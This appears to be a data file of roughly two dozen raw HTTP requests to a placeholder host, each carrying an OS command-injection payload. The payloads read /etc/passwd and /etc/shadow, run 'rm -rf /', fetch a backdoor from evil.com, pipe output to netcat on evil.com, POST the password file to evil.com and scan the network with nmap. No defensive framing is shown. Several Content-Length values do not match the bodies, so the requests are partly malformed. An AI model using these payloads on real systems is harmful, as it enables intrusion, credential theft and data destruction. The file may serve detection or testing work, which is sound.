user_input:
POST /ping.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

host=127.0.0.1; cat /etc/passwd

GET /exec.php?cmd=whoami HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /system.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

command=ls -la && rm -rf /

GET /run.php?script=test.sh && wget http://evil.com/backdoor.sh HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/execute HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 78

{"cmd":"ping 8.8.8.8 | nc evil.com 4444"}

GET /admin.php?action=backup && tar -czf /tmp/data.tar.gz /home HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /upload.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

file=test.txt; curl -X POST http://evil.com -d @/etc/passwd

GET /process.php?id=123 | grep password HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/system HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 98

{"action":"restart","service":"apache2 && echo 'hacked' > /tmp/hacked.txt"}

GET /cmd.php?exec=ps aux | grep mysql HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /backup.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

dir=/var/www && find . -name '*.php' -exec cat {} \;

GET /status.php?check=`id` HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/deploy HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 89

{"version":"1.0","script":"git pull && chmod +x deploy.sh && ./deploy.sh"}

GET /test.php?param=test && netstat -tulpn HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /monitor.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

service=apache2; systemctl status apache2 && cat /var/log/apache2/access.log

GET /debug.php?info=1 && cat /proc/version HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/logs HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 98

{"type":"error","filter":"ERROR && tail -f /var/log/syslog"}

GET /config.php?show=1 | head -20 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /update.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

version=latest && apt update && apt install -y nmap

GET /scan.php?target=192.168.1.1 && nmap -sS 192.168.1.0/24 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /api/health HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 78

{"check":"disk","command":"df -h && free -m"}

GET /info.php?system=1 && uname -a && whoami HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

POST /maintenance.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

action=cleanup && find /tmp -type f -name '*.tmp' -delete && echo 'Cleanup completed'

GET /report.php?type=security && cat /etc/shadow HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
